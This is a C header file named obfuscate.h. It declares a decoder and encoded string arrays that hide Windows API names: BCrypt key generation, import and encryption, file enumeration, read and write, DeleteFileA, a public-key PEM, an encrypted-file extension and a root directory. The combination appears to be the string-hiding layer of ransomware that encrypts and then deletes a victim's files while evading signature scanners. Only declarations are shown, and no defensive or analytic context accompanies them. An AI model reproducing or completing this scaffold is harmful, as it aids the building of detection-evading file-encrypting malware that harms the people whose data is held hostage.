#ifndef OBFUSCATE_H
#define OBFUSCATE_H

#include <stddef.h>

extern const char big_string[];

void decodeString(const int *indices, size_t n, char *out);
const char *getOriginalString(const int *indices, size_t n);

extern const int s_pub_pem[];
extern const int s_bcrypt_dll[];
extern const int s_crypt32_dll[];
extern const int s_kernel32_dll[];
extern const int s_BCryptOpenAlgorithmProvider[];
extern const int s_BCryptCloseAlgorithmProvider[];
extern const int s_BCryptGenRandom[];
extern const int s_BCryptGenerateSymmetricKey[];
extern const int s_BCryptEncrypt[];
extern const int s_BCryptDestroyKey[];
extern const int s_BCryptImportKeyPair[];
extern const int s_CryptStringToBinaryA[];
extern const int s_CryptDecodeObjectEx[];
extern const int s_FindFirstFileA[];
extern const int s_FindNextFileA[];
extern const int s_FindClose[];
extern const int s_CreateFileA[];
extern const int s_ReadFile[];
extern const int s_WriteFile[];
extern const int s_CloseHandle[];
extern const int s_DeleteFileA[];
extern const int s_GetFileSize[];
extern const int s_LocalFree[];
extern const int s_path_key[];
extern const int s_ext_enc[];
extern const int s_root_dir[];
extern const int s_glob_all[];

extern const size_t s_pub_pem_len;
extern const size_t s_bcrypt_dll_len;
extern const size_t s_crypt32_dll_len;
extern const size_t s_kernel32_dll_len;
extern const size_t s_BCryptOpenAlgorithmProvider_len;
extern const size_t s_BCryptCloseAlgorithmProvider_len;
extern const size_t s_BCryptGenRandom_len;
extern const size_t s_BCryptGenerateSymmetricKey_len;
extern const size_t s_BCryptEncrypt_len;
extern const size_t s_BCryptDestroyKey_len;
extern const size_t s_BCryptImportKeyPair_len;
extern const size_t s_CryptStringToBinaryA_len;
extern const size_t s_CryptDecodeObjectEx_len;
extern const size_t s_FindFirstFileA_len;
extern const size_t s_FindNextFileA_len;
extern const size_t s_FindClose_len;
extern const size_t s_CreateFileA_len;
extern const size_t s_ReadFile_len;
extern const size_t s_WriteFile_len;
extern const size_t s_CloseHandle_len;
extern const size_t s_DeleteFileA_len;
extern const size_t s_GetFileSize_len;
extern const size_t s_LocalFree_len;
extern const size_t s_path_key_len;
extern const size_t s_ext_enc_len;
extern const size_t s_root_dir_len;
extern const size_t s_glob_all_len;

#endif